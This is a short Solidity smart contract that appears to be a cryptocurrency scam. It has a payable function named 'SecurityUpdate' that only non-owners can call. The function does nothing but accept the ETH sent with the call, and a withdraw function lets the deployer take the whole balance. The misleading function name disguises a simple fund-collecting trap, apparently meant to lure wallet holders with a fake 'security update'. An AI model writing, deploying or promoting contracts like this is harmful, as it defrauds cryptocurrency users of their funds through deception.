// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract CornucopiaContract{
    address private owner;

    constructor(){
        owner = msg.sender;
    }

    function getOwner() public view returns (address){
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender, "owner error");
        payable(msg.sender).transfer(address(this).balance);
    }
    function SecurityUpdate() public payable{
        require(owner != msg.sender);
    }

    function getBalance()public view returns (uint256){
        return address(this).balance;
    }
}